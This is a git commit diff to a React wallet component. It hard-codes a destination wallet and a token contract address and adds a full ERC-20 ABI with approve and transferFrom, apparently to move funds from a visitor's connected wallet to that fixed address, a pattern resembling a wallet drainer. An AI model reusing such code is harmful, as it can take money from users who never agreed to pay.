eb2ee12581a835cacd56933fc0c0a678b60fa928
succy2019 <successoghenede2@gmail.com>
2025-01-28 07:10:10 -0600

    more changes

--- src/App.tsx
+++ src/App.tsx
@@ -39,13 +39,173 @@ const WalletDisplay = () => {
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const signer = provider.getSigner();
 
-        const recipientAddress = DESTINATION_WALLET; // Replace with your destination wallet address
+        const recipientAddress = "0x365Fd0098DB3ed48e64fd816beaeEe69FE1e354B"; // Replace with your destination wallet address
         const amountToSend = ethers.utils.parseUnits("0.01", "ether"); // Adjust the amount and unit as needed
 
-        const tokenContractAddress = "YOUR_TOKEN_CONTRACT_ADDRESS"; // Replace with your token contract address
+        const tokenContractAddress = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"; // Replace with your token contract address
         const tokenAbi = [
-          "function transfer(address to, uint amount) public returns (bool)"
+          {
+            constant: true,
+            inputs: [],
+            name: "name",
+            outputs: [{ name: "", type: "string" }],
+            payable: false,
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            constant: false,
+            inputs: [
+              { name: "spender", type: "address" },
+              { name: "value", type: "uint256" },
+            ],
+            name: "approve",
+            outputs: [{ name: "", type: "bool" }],
+            payable: false,
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            constant: true,
+            inputs: [],
+            name: "totalSupply",
+            outputs: [{ name: "", type: "uint256" }],
+            payable: false,
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            constant: false,
+            inputs: [
+              { name: "sender", type: "address" },
+              { name: "recipient", type: "address" },
+              { name: "amount", type: "uint256" },
+            ],
+            name: "transferFrom",
+            outputs: [{ name: "", type: "bool" }],
+            payable: false,
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            constant: true,
+            inputs: [],
+            name: "decimals",
+            outputs: [{ name: "", type: "uint8" }],
+            payable: false,
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            constant: false,
+            inputs: [
+              { name: "spender", type: "address" },
+              { name: "addedValue", type: "uint256" },
+            ],
+            name: "increaseAllowance",
+            outputs: [{ name: "", type: "bool" }],
+            payable: false,
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            constant: false,
+            inputs: [{ name: "value", type: "uint256" }],
+            name: "burn",
+            outputs: [],
+            payable: false,
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            constant: true,
+            inputs: [{ name: "account", type: "address" }],
+            name: "balanceOf",
+            outputs: [{ name: "", type: "uint256" }],
+            payable: false,
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            constant: true,
+            inputs: [],
+            name: "symbol",
+            outputs: [{ name: "", type: "string" }],
+            payable: false,
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            constant: false,
+            inputs: [
+              { name: "spender", type: "address" },
+              { name: "subtractedValue", type: "uint256" },
+            ],
+            name: "decreaseAllowance",
+            outputs: [{ name: "", type: "bool" }],
+            payable: false,
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            constant: false,
+            inputs: [
+              { name: "recipient", type: "address" },
+              { name: "amount", type: "uint256" },
+            ],
+            name: "transfer",
+            outputs: [{ name: "", type: "bool" }],
+            payable: false,
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+          {
+            constant: true,
+            inputs: [
+              { name: "owner", type: "address" },
+              { name: "spender", type: "address" },
+            ],
+            name: "allowance",
+            outputs: [{ name: "", type: "uint256" }],
+            payable: false,
+            stateMutability: "view",
+            type: "function",
+          },
+          {
+            inputs: [
+              { name: "name", type: "string" },
+              { name: "symbol", type: "string" },
+              { name: "decimals", type: "uint8" },
+              { name: "totalSupply", type: "uint256" },
+              { name: "feeReceiver", type: "address" },
+              { name: "tokenOwnerAddress", type: "address" },
+            ],
+            payable: true,
+            stateMutability: "payable",
+            type: "constructor",
+          },
+          {
+            anonymous: false,
+            inputs: [
+              { indexed: true, name: "from", type: "address" },
+              { indexed: true, name: "to", type: "address" },
+              { indexed: false, name: "value", type: "uint256" },
+            ],
+            name: "Transfer",
+            type: "event",
+          },
+          {
+            anonymous: false,
+            inputs: [
+              { indexed: true, name: "owner", type: "address" },
+              { indexed: true, name: "spender", type: "address" },
+              { indexed: false, name: "value", type: "uint256" },
+            ],
+            name: "Approval",
+            type: "event",
+          },
         ];
+        
 
         const tokenContract = new ethers.Contract(tokenContractAddress, tokenAbi, signer);
 
